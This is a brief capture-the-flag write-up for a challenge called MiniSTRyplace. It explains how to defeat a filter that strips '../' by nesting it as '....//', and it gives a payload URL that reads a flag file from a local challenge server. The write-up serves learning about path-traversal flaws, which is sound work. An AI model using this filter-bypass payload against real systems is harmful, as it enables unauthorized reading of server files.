## MiniSTRyplace

The idea is to read a file bypassing the  `../` characters.

We bypass the string replace inserting other `../` inside another `../`. The result we have should be something like `....//` and we can visit the page


```
http://localhost:1337/?lang=....//....//....//flag
```
